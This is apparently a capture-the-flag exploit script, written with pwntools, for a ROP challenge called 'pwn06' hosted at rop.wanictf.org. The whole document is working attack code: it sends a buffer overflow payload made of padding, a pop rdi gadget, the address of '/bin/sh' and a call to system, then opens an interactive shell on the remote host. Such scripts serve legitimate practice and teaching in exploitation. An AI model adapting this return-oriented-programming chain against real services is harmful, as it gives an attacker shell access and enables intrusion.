from pwn import *
r = remote("rop.wanictf.org", 9006)
#r = process("./pwn06")
pause()
elf = ELF("./pwn06")
system = elf.plt['system']
pop_rdi = 0x0000000000400a53
binsh =0x601080
ret = 0x40065e
r.sendline("A" * 22 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))
r.interactive()
